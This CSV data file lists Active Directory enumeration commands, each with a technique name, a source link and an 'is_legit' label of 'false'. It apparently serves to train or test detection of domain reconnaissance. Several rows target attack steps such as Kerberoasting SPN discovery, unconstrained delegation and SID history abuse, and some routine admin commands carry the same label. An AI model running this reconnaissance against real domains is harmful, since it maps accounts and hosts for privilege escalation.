"Technique/Command_Name","Command","Type","Reference","is_legit"
"Collect Domain SID","Get-ADDomain | Select-Object SID","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addomain","false"
"List Domain Controllers","nltest /dclist:domain","CMD","https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)","false"
"Enumerate Domain Groups","Get-ADGroup -Filter * | Select-Object Name","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup","false"
"Check AD Replication Status","repadmin /replsummary","CMD","https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/repadmin","false"
"Enumerate Domain Users","Get-ADUser -Filter * | Select-Object Name, SamAccountName","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Get Domain Password Policy","Get-ADDefaultDomainPasswordPolicy","PowerShell","https://github.com/tobor88/PowerShell-Red-Team","false"
"Identify Members of Domain Admins","Get-ADGroupMember -Identity ""Domain Admins""","PowerShell","https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember","false"
"Check Kerberos Ticket Policy","Get-ADDefaultDomainPasswordPolicy | Select-Object -ExpandProperty KerberosTicketPolicy","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"List All Organizational Units (OUs)","Get-ADOrganizationalUnit -Filter *","PowerShell","https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adorganizationalunit","false"
"Identify Users with Delegation Privileges","Get-ADUser -Filter {TrustedForDelegation -eq $true}","PowerShell","https://github.com/tobor88/PowerShell-Red-Team","false"
"List AD Users with Details","Get-ADUser -Filter * -Properties DisplayName, EmailAddress, LastLogonDate","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory","false"
"Identify Accounts with SPNs (Kerberoasting)","Get-ADUser -Filter {ServicePrincipalName -ne ""$null""} -Properties ServicePrincipalName","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Find Admin Accounts","dsquery user -name *admin*","CMD","https://book.hacktricks.xyz/windows-hardening/active-directory-methodology","false"
"List all Domain Computers","Get-ADComputer -Filter * | Select-Object Name, OperatingSystem","PowerShell","https://medium.com/@zycc2727/enumerating-active-directory-e1356579ebd","false"
"Check Group Policy Objects (GPOs)","Get-GPO -All","PowerShell","https://activedirectorypro.com/powershell-commands/","false"
"List Privileged Groups","net group ""Domain Admins"" /domain","CMD","https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide","false"
"Find Machines with Unconstrained Delegation","Get-ADComputer -Filter {TrustedForDelegation -eq $true}","PowerShell","https://github.com/tobor88/PowerShell-Red-Team","false"
"Check User Account Lockout Status","Get-ADUser -Filter * -Properties LockedOut | Where-Object {$_.LockedOut -eq $true}","PowerShell","https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf?ref=secjuice.com","false"
"Identify Expired Passwords","Search-ADAccount -PasswordExpired | Select-Object Name, PasswordExpired","PowerShell","https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration","false"
"Query all Domain Services","nltest /dsgetdc:domain","CMD","https://medium.com/r3d-buck3t/domain-enumeration-with-active-directory-powershell-module-7ce4fcfe91d3","false"
"Enumerate Trusted Domains","nltest /trusted_domains","CMD","https://github.com/geeksniper/active-directory-pentest","false"
"List AD Sites","Get-ADReplicationSite -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory","false"
"Get Domain Forest Information","Get-ADForest","PowerShell","https://www.cbtnuggets.com/blog/certifications/microsoft/6-common-active-directory-powershell-commands","false"
"Find SID History for Users (SID History Abuse)","Get-ADUser -Filter * -Properties SIDHistory | Where-Object {$_.SIDHistory}","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Check Domain Controller Certificates","certutil -dcinfo verify","CMD","https://github.com/tobor88/PowerShell-Red-Team","false"
